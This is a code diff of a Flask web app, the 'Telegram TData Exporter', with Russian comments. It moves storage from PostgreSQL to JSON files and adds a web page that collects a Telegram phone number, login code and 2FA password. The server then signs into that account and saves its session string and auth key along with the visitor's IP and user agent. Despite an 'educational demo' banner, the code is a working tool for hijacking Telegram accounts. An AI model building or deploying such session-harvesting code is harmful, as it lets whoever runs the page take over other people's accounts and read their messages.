@@ -4,7 +4,6 @@ import logging
 import time
 import threading
 import json
-import psycopg2
 from datetime import datetime
 from flask import Flask, request, jsonify
 from pyrogram import Client
@@ -22,209 +21,128 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-# Конфигурация PostgreSQL
-POSTGRES_CONFIG = {
-    'host': os.getenv('POSTGRES_HOST', 'localhost'),
-    'port': os.getenv('POSTGRES_PORT', '5432'),
-    'database': os.getenv('POSTGRES_DB', 'telegram_sessions'),
-    'user': os.getenv('POSTGRES_USER', 'postgres'),
-    'password': os.getenv('POSTGRES_PASSWORD', 'password')
-}
-
-class DatabaseManager:
+class JSONStorageManager:
+    """Менеджер JSON хранилища"""
     def __init__(self):
-        self.conn = None
-        self.connect()
-        self.init_tables()
+        self.storage_path = "./tdata_storage"
+        self.init_storage()
     
-    def connect(self):
-        """Подключение к PostgreSQL"""
+    def init_storage(self):
+        """Инициализация хранилища"""
         try:
-            self.conn = psycopg2.connect(**POSTGRES_CONFIG)
-            logger.info("✅ Подключение к PostgreSQL установлено")
+            os.makedirs(f"{self.storage_path}/users", exist_ok=True)
+            os.makedirs(f"{self.storage_path}/sessions", exist_ok=True)
+            os.makedirs(f"{self.storage_path}/tdata", exist_ok=True)
+            logger.info("✅ JSON хранилище инициализировано")
         except Exception as e:
-            logger.error(f"❌ Ошибка подключения к PostgreSQL: {e}")
-    
-    def init_tables(self):
-        """Инициализация таблиц"""
-        try:
-            with self.conn.cursor() as cur:
-                # Таблица пользователей
-                cur.execute('''
-                    CREATE TABLE IF NOT EXISTS users (
-                        id BIGSERIAL PRIMARY KEY,
-                        user_id BIGINT UNIQUE NOT NULL,
-                        phone_number VARCHAR(20) NOT NULL,
-                        first_name VARCHAR(255),
-                        last_name VARCHAR(255),
-                        username VARCHAR(255),
-                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                    )
-                ''')
-                
-                # Таблица TData сессий
-                cur.execute('''
-                    CREATE TABLE IF NOT EXISTS tdata_sessions (
-                        id BIGSERIAL PRIMARY KEY,
-                        user_id BIGINT REFERENCES users(user_id) ON DELETE CASCADE,
-                        session_string TEXT NOT NULL,
-                        auth_key BYTEA,
-                        dc_id INTEGER NOT NULL,
-                        api_id INTEGER NOT NULL,
-                        api_hash VARCHAR(255) NOT NULL,
-                        device_model VARCHAR(100),
-                        system_version VARCHAR(50),
-                        app_version VARCHAR(50),
-                        lang_code VARCHAR(10),
-                        system_lang_code VARCHAR(10),
-                        ip_address INET,
-                        user_agent TEXT,
-                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                        is_active BOOLEAN DEFAULT TRUE
-                    )
-                ''')
-                
-                # Таблица для хранения полного TData
-                cur.execute('''
-                    CREATE TABLE IF NOT EXISTS tdata_full (
-                        id BIGSERIAL PRIMARY KEY,
-                        user_id BIGINT REFERENCES users(user_id) ON DELETE CASCADE,
-                        tdata_json JSONB NOT NULL,
-                        session_id BIGINT REFERENCES tdata_sessions(id) ON DELETE CASCADE,
-                        exported_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                    )
-                ''')
-                
-                self.conn.commit()
-                logger.info("✅ Таблицы PostgreSQL инициализированы")
-                
-        except Exception as e:
-            logger.error(f"❌ Ошибка инициализации таблиц: {e}")
+            logger.error(f"❌ Ошибка инициализации хранилища: {e}")
     
     def save_user(self, user_data):
-        """Сохранение пользователя в базу"""
+        """Сохранение пользователя"""
         try:
-            with self.conn.cursor() as cur:
-                cur.execute('''
-                    INSERT INTO users (user_id, phone_number, first_name, last_name, username)
-                    VALUES (%s, %s, %s, %s, %s)
-                    ON CONFLICT (user_id) 
-                    DO UPDATE SET 
-                        first_name = EXCLUDED.first_name,
-                        last_name = EXCLUDED.last_name,
-                        username = EXCLUDED.username,
-                        updated_at = CURRENT_TIMESTAMP
-                    RETURNING id
-                ''', (
-                    user_data['id'],
-                    user_data.get('phone_number', ''),
-                    user_data.get('first_name', ''),
-                    user_data.get('last_name', ''),
-                    user_data.get('username', '')
-                ))
-                self.conn.commit()
-                return True
+            user_file = f"{self.storage_path}/users/{user_data['id']}.json"
+            with open(user_file, 'w', encoding='utf-8') as f:
+                json.dump(user_data, f, indent=2, ensure_ascii=False)
+            return True
         except Exception as e:
             logger.error(f"❌ Ошибка сохранения пользователя: {e}")
             return False
     
-    def save_tdata_session(self, user_id, session_data, request_info=None):
-        """Сохранение TData сессии"""
+    def save_session(self, user_id, session_data, request_info=None):
+        """Сохранение сессии"""
         try:
-            with self.conn.cursor() as cur:
-                cur.execute('''
-                    INSERT INTO tdata_sessions 
-                    (user_id, session_string, auth_key, dc_id, api_id, api_hash, 
-                     device_model, system_version, app_version, lang_code, system_lang_code,
-                     ip_address, user_agent)
-                    VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
-                    RETURNING id
-                ''', (
-                    user_id,
-                    session_data.get('session_string'),
-                    session_data.get('auth_key'),
-                    session_data.get('dc_id'),
-                    session_data.get('api_id'),
-                    session_data.get('api_hash'),
-                    session_data.get('device_model', 'Pyrogram'),
-                    session_data.get('system_version', '1.0'),
-                    session_data.get('app_version', '1.0'),
-                    session_data.get('lang_code', 'en'),
-                    session_data.get('system_lang_code', 'en'),
-                    request_info.get('ip') if request_info else None,
-                    request_info.get('user_agent') if request_info else None
-                ))
-                session_id = cur.fetchone()[0]
-                self.conn.commit()
-                return session_id
+            session_id = int(time.time() * 1000)
+            session_file = f"{self.storage_path}/sessions/{session_id}.json"
+            
+            session_record = {
+                'id': session_id,
+                'user_id': user_id,
+                'session_data': session_data,
+                'request_info': request_info,
+                'created_at': datetime.now().isoformat(),
+                'is_active': True
+            }
+            
+            with open(session_file, 'w', encoding='utf-8') as f:
+                json.dump(session_record, f, indent=2, ensure_ascii=False)
+            
+            return session_id
         except Exception as e:
-            logger.error(f"❌ Ошибка сохранения TData сессии: {e}")
+            logger.error(f"❌ Ошибка сохранения сессии: {e}")
             return None
     
-    def save_full_tdata(self, user_id, session_id, tdata_json):
-        """Сохранение полного TData в JSON формате"""
+    def save_tdata(self, user_id, session_id, tdata_json):
+        """Сохранение TData"""
         try:
-            with self.conn.cursor() as cur:
-                cur.execute('''
-                    INSERT INTO tdata_full (user_id, session_id, tdata_json)
-                    VALUES (%s, %s, %s)
-                    RETURNING id
-                ''', (user_id, session_id, json.dumps(tdata_json)))
-                tdata_id = cur.fetchone()[0]
-                self.conn.commit()
-                return tdata_id
+            tdata_id = int(time.time() * 1000)
+            tdata_file = f"{self.storage_path}/tdata/{tdata_id}.json"
+            
+            tdata_record = {
+                'id': tdata_id,
+                'user_id': user_id,
+                'session_id': session_id,
+                'tdata_json': tdata_json,
+                'exported_at': datetime.now().isoformat()
+            }
+            
+            with open(tdata_file, 'w', encoding='utf-8') as f:
+                json.dump(tdata_record, f, indent=2, ensure_ascii=False)
+            
+            return tdata_id
         except Exception as e:
-            logger.error(f"❌ Ошибка сохранения полного TData: {e}")
+            logger.error(f"❌ Ошибка сохранения TData: {e}")
             return None
     
     def get_user_sessions(self, user_id):
-        """Получение всех сессий пользователя"""
+        """Получение сессий пользователя"""
         try:
-            with self.conn.cursor() as cur:
-                cur.execute('''
-                    SELECT ts.id, ts.session_string, ts.dc_id, ts.created_at, ts.is_active,
-                           u.phone_number, u.first_name, u.username
-                    FROM tdata_sessions ts
-                    JOIN users u ON ts.user_id = u.user_id
-                    WHERE ts.user_id = %s
-                    ORDER BY ts.created_at DESC
-                ''', (user_id,))
-                
-                sessions = []
-                for row in cur.fetchall():
-                    sessions.append({
-                        'id': row[0],
-                        'session_string': row[1],
-                        'dc_id': row[2],
-                        'created_at': row[3].isoformat(),
-                        'is_active': row[4],
-                        'phone_number': row[5],
-                        'first_name': row[6],
-                        'username': row[7]
-                    })
-                return sessions
+            sessions = []
+            sessions_dir = f"{self.storage_path}/sessions"
+            
+            if not os.path.exists(sessions_dir):
+                return []
+            
+            for filename in os.listdir(sessions_dir):
+                if filename.endswith('.json'):
+                    filepath = os.path.join(sessions_dir, filename)
+                    with open(filepath, 'r', encoding='utf-8') as f:
+                        session_data = json.load(f)
+                        if session_data.get('user_id') == user_id:
+                            sessions.append({
+                                'id': session_data['id'],
+                                'session_string': session_data['session_data'].get('session_string'),
+                                'dc_id': session_data['session_data'].get('dc_id'),
+                                'created_at': session_data['created_at'],
+                                'is_active': session_data.get('is_active', True)
+                            })
+            
+            return sorted(sessions, key=lambda x: x['created_at'], reverse=True)
         except Exception as e:
-            logger.error(f"❌ Ошибка получения сессий пользователя: {e}")
+            logger.error(f"❌ Ошибка получения сессий: {e}")
             return []
     
-    def deactivate_session(self, session_id):
-        """Деактивация сессии"""
+    def get_stats(self):
+        """Статистика хранилища"""
         try:
-            with self.conn.cursor() as cur:
-                cur.execute('''
-                    UPDATE tdata_sessions 
-                    SET is_active = FALSE 
-                    WHERE id = %s
-                ''', (session_id,))
-                self.conn.commit()
-                return True
+            users_dir = f"{self.storage_path}/users"
+            sessions_dir = f"{self.storage_path}/sessions"
+            tdata_dir = f"{self.storage_path}/tdata"
+            
+            users_count = len([f for f in os.listdir(users_dir) if f.endswith('.json')]) if os.path.exists(users_dir) else 0
+            sessions_count = len([f for f in os.listdir(sessions_dir) if f.endswith('.json')]) if os.path.exists(sessions_dir) else 0
+            tdata_count = len([f for f in os.listdir(tdata_dir) if f.endswith('.json')]) if os.path.exists(tdata_dir) else 0
+            
+            return {
+                'total_users': users_count,
+                'active_sessions': sessions_count,
+                'total_tdata_records': tdata_count
+            }
         except Exception as e:
-            logger.error(f"❌ Ошибка деактивации сессии: {e}")
-            return False
+            logger.error(f"❌ Ошибка получения статистики: {e}")
+            return {'total_users': 0, 'active_sessions': 0, 'total_tdata_records': 0}
 
-# Инициализация базы данных
-db_manager = DatabaseManager()
+# Инициализация хранилища
+storage = JSONStorageManager()
 
 # Создаем отдельный event loop для асинхронных операций
 class AsyncRunner:
@@ -272,9 +190,6 @@ def load_api_keys():
 API_ID, API_HASH, SECRET_KEY = load_api_keys()
 app.secret_key = SECRET_KEY
 
-# Хранилище для активных сессий
-AUTH_SESSIONS = {}
-
 class TelegramAuthTester:
     def __init__(self):
         self.api_id = None
@@ -302,8 +217,8 @@ class TelegramAuthTester:
             logger.error(f"❌ Ошибка инициализации: {e}")
             self.initialized = False
     
-    async def export_tdata_to_db(self, client, user_info, request_info=None):
-        """Экспорт TData в базу данных"""
+    async def export_tdata(self, client, user_info, request_info=None):
+        """Экспорт TData"""
         try:
             # Экспортируем session string
             session_string = await client.export_session_string()
@@ -330,12 +245,12 @@ class TelegramAuthTester:
             }
             
             # Сохраняем пользователя
-            db_manager.save_user(user_info)
+            storage.save_user(user_info)
             
             # Сохраняем сессию
             session_data = {
                 'session_string': session_string,
-                'auth_key': client.auth_key.key if client.auth_key else None,
+                'auth_key': client.auth_key.key.hex() if client.auth_key else None,
                 'dc_id': client.dc_id,
                 'api_id': self.api_id,
                 'api_hash': self.api_hash,
@@ -346,7 +261,7 @@ class TelegramAuthTester:
                 'system_lang_code': 'en'
             }
             
-            session_id = db_manager.save_tdata_session(
+            session_id = storage.save_session(
                 user_info['id'], 
                 session_data, 
                 request_info
@@ -354,13 +269,13 @@ class TelegramAuthTester:
             
             if session_id:
                 # Сохраняем полный TData
-                tdata_id = db_manager.save_full_tdata(
+                tdata_id = storage.save_tdata(
                     user_info['id'], 
                     session_id, 
                     tdata_info
                 )
                 
-                logger.info(f"💾 TData сохранен в базу. Session ID: {session_id}, TData ID: {tdata_id}")
+                logger.info(f"💾 TData сохранен. Session ID: {session_id}, TData ID: {tdata_id}")
                 
                 return {
                     'success': True,
@@ -368,17 +283,17 @@ class TelegramAuthTester:
                     'tdata_id': tdata_id,
                     'user_id': user_info['id'],
                     'session_string': session_string,
-                    'message': 'TData успешно экспортирован в базу данных'
+                    'message': 'TData успешно экспортирован в JSON хранилище'
                 }
             else:
-                return {'success': False, 'error': 'Ошибка сохранения сессии в базу'}
+                return {'success': False, 'error': 'Ошибка сохранения сессии'}
                 
         except Exception as e:
-            logger.error(f"❌ Ошибка экспорта TData в базу: {e}")
+            logger.error(f"❌ Ошибка экспорта TData: {e}")
             return {'success': False, 'error': f'Ошибка экспорта: {str(e)}'}
     
     async def full_auth_and_export(self, phone_number, code, password_2fa=None, request_info=None):
-        """Полная аутентификация и экспорт TData в базу"""
+        """Полная аутентификация и экспорт TData"""
         client = None
         try:
             # Создаем временного клиента
@@ -416,8 +331,8 @@ class TelegramAuthTester:
                 'username': me.username
             }
             
-            # Экспортируем TData в базу
-            export_result = await self.export_tdata_to_db(client, user_info, request_info)
+            # Экспортируем TData
+            export_result = await self.export_tdata(client, user_info, request_info)
             
             await client.disconnect()
             
@@ -447,10 +362,345 @@ class TelegramAuthTester:
 # Инициализация
 auth_tester = TelegramAuthTester()
 
-# 🎯 API Endpoints
+# 🎯 Главная страница с HTML интерфейсом
+@app.route('/')
+def home():
+    """Главная страница с интерфейсом"""
+    stats = storage.get_stats()
+    
+    return f'''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Telegram TData Exporter</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {{
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }}
+        .container {{
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }}
+        .header {{
+            text-align: center;
+            margin-bottom: 30px;
+        }}
+        .stats {{
+            background: #e8f5e8;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }}
+        .step {{
+            margin-bottom: 25px;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }}
+        .input-group {{
+            margin-bottom: 15px;
+        }}
+        label {{
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }}
+        input[type="text"], input[type="password"] {{
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }}
+        button {{
+            background: #007bff;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }}
+        button:hover {{
+            background: #0056b3;
+        }}
+        button:disabled {{
+            background: #6c757d;
+            cursor: not-allowed;
+        }}
+        .alert {{
+            padding: 12px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }}
+        .success {{
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }}
+        .error {{
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }}
+        .info {{
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }}
+        .warning {{
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }}
+        .hidden {{
+            display: none;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Telegram TData Exporter</h1>
+            <p>Educational Demo - Экспорт сессий Telegram</p>
+        </div>
+
+        <div class="stats">
+            <h3>📊 Статистика хранилища:</h3>
+            <p>👥 Пользователей: {stats['total_users']}</p>
+            <p>💾 Сессий: {stats['active_sessions']}</p>
+            <p>🗂️ TData записей: {stats['total_tdata_records']}</p>
+        </div>
+
+        <div class="alert warning">
+            ⚠️ <strong>ВНИМАНИЕ:</strong> Это образовательная демонстрация. Используйте только тестовые данные!
+        </div>
+
+        <div id="step1" class="step">
+            <h3>📱 Шаг 1: Введите номер телефона</h3>
+            <div class="input-group">
+                <label for="phone">Номер телефона:</label>
+                <input type="text" id="phone" placeholder="+79220470330" value="+79220470330">
+            </div>
+            <button onclick="requestCode()" id="requestBtn">Получить код</button>
+        </div>
+
+        <div id="step2" class="step hidden">
+            <h3>🔢 Шаг 2: Введите код из Telegram</h3>
+            <div class="input-group">
+                <label for="code">5-значный код:</label>
+                <input type="text" id="code" placeholder="12345" maxlength="5">
+            </div>
+            <button onclick="verifyCode()" id="verifyBtn">Проверить код</button>
+        </div>
+
+        <div id="step3" class="step hidden">
+            <h3>🔒 Шаг 3: Введите пароль 2FA (если требуется)</h3>
+            <div class="alert info">
+                Этот аккаунт защищен двухфакторной аутентификацией
+            </div>
+            <div class="input-group">
+                <label for="password">Пароль 2FA:</label>
+                <input type="password" id="password" placeholder="Введите пароль">
+            </div>
+            <button onclick="verifyPassword()" id="passwordBtn">Проверить пароль</button>
+        </div>
+
+        <div id="results"></div>
+    </div>
+
+    <script>
+        let currentSessionId = '';
+        let currentPhone = '';
+
+        function showAlert(message, type) {{
+            const results = document.getElementById('results');
+            results.innerHTML = '<div class="alert ' + type + '">' + message + '</div>';
+        }}
+
+        function showStep(stepNumber) {{
+            // Скрываем все шаги
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.add('hidden');
+            
+            // Показываем нужный шаг
+            document.getElementById('step' + stepNumber).classList.remove('hidden');
+        }}
+
+        async function requestCode() {{
+            const phone = document.getElementById('phone').value.trim();
+            currentPhone = phone;
+
+            if (!phone) {{
+                showAlert('Введите номер телефона', 'error');
+                return;
+            }}
+
+            const btn = document.getElementById('requestBtn');
+            btn.disabled = true;
+            btn.textContent = 'Отправка...';
+
+            try {{
+                const response = await fetch('/api/auth/export-tdata', {{
+                    method: 'POST',
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{
+                        phone: phone,
+                        code: '00000'  // Заглушка, код введем позже
+                    }})
+                }});
+                
+                if (!response.ok) {{
+                    const errorText = await response.text();
+                    throw new Error(`HTTP error! status: ${{response.status}}`);
+                }}
+                
+                const data = await response.json();
+                
+                if (data.success || data.needs_password) {{
+                    showStep(2);
+                    showAlert('✅ Код отправлен! Проверьте Telegram и введите код.', 'success');
+                    document.getElementById('code').focus();
+                }} else {{
+                    showAlert('❌ ' + data.error, 'error');
+                }}
+            }} catch (error) {{
+                console.error('Error:', error);
+                showAlert('❌ Ошибка сети: ' + error.message, 'error');
+            }} finally {{
+                btn.disabled = false;
+                btn.textContent = 'Получить код';
+            }}
+        }}
+
+        async function verifyCode() {{
+            const code = document.getElementById('code').value.trim();
+
+            if (!code || code.length !== 5) {{
+                showAlert('Введите 5-значный код из Telegram', 'error');
+                return;
+            }}
+
+            const btn = document.getElementById('verifyBtn');
+            btn.disabled = true;
+            btn.textContent = 'Проверка...';
+
+            try {{
+                const response = await fetch('/api/auth/export-tdata', {{
+                    method: 'POST',
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{
+                        phone: currentPhone,
+                        code: code
+                    }})
+                }});
+                
+                if (!response.ok) {{
+                    const errorText = await response.text();
+                    throw new Error(`HTTP error! status: ${{response.status}}`);
+                }}
+                
+                const data = await response.json();
+                
+                if (data.success) {{
+                    if (data.needs_password) {{
+                        showStep(3);
+                        showAlert('🔒 Требуется пароль двухфакторной аутентификации', 'info');
+                        document.getElementById('password').focus();
+                    }} else {{
+                        showAlert('✅ ' + data.message + ' TData экспортирован!', 'success');
+                        if (data.user_info) {{
+                            showAlert('👤 Пользователь: ' + data.user_info.first_name + ' (@' + data.user_info.username + ')', 'info');
+                        }}
+                    }}
+                }} else {{
+                    showAlert('❌ ' + data.error, 'error');
+                }}
+            }} catch (error) {{
+                console.error('Error:', error);
+                showAlert('❌ Ошибка сети: ' + error.message, 'error');
+            }} finally {{
+                btn.disabled = false;
+                btn.textContent = 'Проверить код';
+            }}
+        }}
+
+        async function verifyPassword() {{
+            const password = document.getElementById('password').value;
+
+            if (!password) {{
+                showAlert('Введите пароль 2FA', 'error');
+                return;
+            }}
+
+            const btn = document.getElementById('passwordBtn');
+            btn.disabled = true;
+            btn.textContent = 'Проверка...';
+
+            try {{
+                const response = await fetch('/api/auth/export-tdata', {{
+                    method: 'POST',
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{
+                        phone: currentPhone,
+                        code: '00000',  // Код уже введен на предыдущем шаге
+                        password_2fa: password
+                    }})
+                }});
+                
+                if (!response.ok) {{
+                    const errorText = await response.text();
+                    throw new Error(`HTTP error! status: ${{response.status}}`);
+                }}
+                
+                const data = await response.json();
+                
+                if (data.success) {{
+                    showAlert('✅ ' + data.message + ' TData экспортирован!', 'success');
+                    if (data.user_info) {{
+                        showAlert('👤 Пользователь: ' + data.user_info.first_name + ' (@' + data.user_info.username + ')', 'info');
+                    }}
+                }} else {{
+                    showAlert('❌ ' + data.error, 'error');
+                }}
+            }} catch (error) {{
+                console.error('Error:', error);
+                showAlert('❌ Ошибка сети: ' + error.message, 'error');
+            }} finally {{
+                btn.disabled = false;
+                btn.textContent = 'Проверить пароль';
+            }}
+        }}
+
+        // Обработчики Enter
+        document.getElementById('phone').addEventListener('keypress', function(e) {{
+            if (e.key === 'Enter') requestCode();
+        }});
+        
+        document.getElementById('code').addEventListener('keypress', function(e) {{
+            if (e.key === 'Enter') verifyCode();
+        }});
+
+        document.getElementById('password').addEventListener('keypress', function(e) {{
+            if (e.key === 'Enter') verifyPassword();
+        }});
+    </script>
+</body>
+</html>
+'''
+
 @app.route('/api/auth/export-tdata', methods=['POST', 'OPTIONS'])
-def export_tdata_to_db():
-    """Полная аутентификация и экспорт TData в базу"""
+def export_tdata():
+    """Аутентификация и экспорт TData"""
     if request.method == 'OPTIONS':
         return jsonify({'status': 'ok'})
         
@@ -463,8 +713,8 @@ def export_tdata_to_db():
         code = data.get('code', '').strip()
         password_2fa = data.get('password_2fa', '')
         
-        if not phone or not code:
-            return jsonify({'success': False, 'error': 'Введите номер и код'}), 400
+        if not phone:
+            return jsonify({'success': False, 'error': 'Введите номер телефона'}), 400
         
         # Информация о запросе для логирования
         request_info = {
@@ -481,62 +731,18 @@ def export_tdata_to_db():
         logger.error(f"❌ Ошибка экспорта TData: {e}")
         return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500
 
-@app.route('/api/sessions/user/<user_id>', methods=['GET'])
-def get_user_sessions(user_id):
-    """Получение всех сессий пользователя"""
+@app.route('/api/storage/stats', methods=['GET'])
+def storage_stats():
+    """Статистика хранилища"""
     try:
-        sessions = db_manager.get_user_sessions(int(user_id))
+        stats = storage.get_stats()
         return jsonify({
             'success': True,
-            'user_id': user_id,
-            'sessions': sessions,
-            'total': len(sessions)
+            'storage_type': 'JSON',
+            'statistics': stats
         })
     except Exception as e:
-        logger.error(f"❌ Ошибка получения сессий: {e}")
-        return jsonify({'success': False, 'error': str(e)}), 500
-
-@app.route('/api/sessions/deactivate/<session_id>', methods=['POST'])
-def deactivate_session(session_id):
-    """Деактивация сессии"""
-    try:
-        success = db_manager.deactivate_session(int(session_id))
-        if success:
-            return jsonify({'success': True, 'message': 'Сессия деактивирована'})
-        else:
-            return jsonify({'success': False, 'error': 'Ошибка деактивации'}), 500
-    except Exception as e:
-        logger.error(f"❌ Ошибка деактивации сессии: {e}")
-        return jsonify({'success': False, 'error': str(e)}), 500
-
-@app.route('/api/db/status', methods=['GET'])
-def db_status():
-    """Статус базы данных"""
-    try:
-        with db_manager.conn.cursor() as cur:
-            # Количество пользователей
-            cur.execute('SELECT COUNT(*) FROM users')
-            users_count = cur.fetchone()[0]
-            
-            # Количество активных сессий
-            cur.execute('SELECT COUNT(*) FROM tdata_sessions WHERE is_active = TRUE')
-            active_sessions = cur.fetchone()[0]
-            
-            # Общее количество TData записей
-            cur.execute('SELECT COUNT(*) FROM tdata_full')
-            tdata_count = cur.fetchone()[0]
-            
-        return jsonify({
-            'success': True,
-            'database_status': 'connected',
-            'statistics': {
-                'total_users': users_count,
-                'active_sessions': active_sessions,
-                'total_tdata_records': tdata_count
-            }
-        })
-    except Exception as e:
-        logger.error(f"❌ Ошибка проверки статуса БД: {e}")
+        logger.error(f"❌ Ошибка получения статистики: {e}")
         return jsonify({'success': False, 'error': str(e)}), 500
 
 if __name__ == '__main__':
